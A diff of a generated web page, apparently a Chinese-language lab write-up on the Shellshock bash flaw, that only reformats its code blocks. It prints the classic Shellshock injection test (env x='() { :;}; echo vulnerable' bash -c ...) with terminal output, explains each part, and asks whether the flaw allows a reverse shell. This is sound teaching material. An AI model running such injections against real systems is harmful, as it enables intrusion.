-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s2">&#34;echo this is a test&#34;</span>
-</span></span></code></pre></div><ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s2">&#34;echo this is a test&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
 <li>
 <p>第一部分会被Bash解析为一个环境变量进行保存 <!-- raw HTML omitted --></p>
 </li>
@@ -506,7 +712,19 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </li>
 <li>
 <p>第三部分为调用一个bash子进程，同时会继承环境变量并执行恶意指令， <code>-c</code> 用来在新的bash下执行代码以表明新bash子进程启动成功 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s2">&#34;echo this is a test&#34;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s2">&#34;echo this is a test&#34;</span>
 </span></span><span class="line"><span class="cl">vulnerable
 </span></span><span class="line"><span class="cl">this is a <span class="nb">test</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ 
@@ -514,15 +732,28 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c :
 </span></span><span class="line"><span class="cl">vulnerable
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 10:14<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>需要注意的是 <code>':'</code> 什么也不做是一个空命令，相当于 <code>::</code> <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="k">if</span> true<span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> yes<span class="p">;</span> <span class="k">fi</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="k">if</span> true<span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> yes<span class="p">;</span> <span class="k">fi</span>
 </span></span><span class="line"><span class="cl">yes
 </span></span><span class="line"><span class="cl">$ <span class="k">if</span> :<span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> yes<span class="p">;</span> <span class="k">fi</span>
 </span></span><span class="line"><span class="cl">yes
 </span></span><span class="line"><span class="cl">$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
 <h4 id="shellshock-的危害">shellshock 的危害</h4>
 <p>可以被用来反弹shell？ <!-- raw HTML omitted --></p>
